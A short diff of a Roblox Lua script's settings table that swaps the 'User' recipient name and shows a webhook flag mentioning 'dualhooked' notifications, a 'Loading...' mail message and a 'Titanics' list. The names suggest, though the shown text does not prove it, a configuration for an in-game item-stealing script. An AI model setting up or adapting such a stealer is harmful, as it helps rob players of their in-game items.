@@ -8,7 +8,7 @@
 ]]--
 
 getgenv().Settings = {
-    User = "TakatoSey",
+    User = "NONAMEINC228",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
     MailMessage = "Loading...",
     Titanics = {
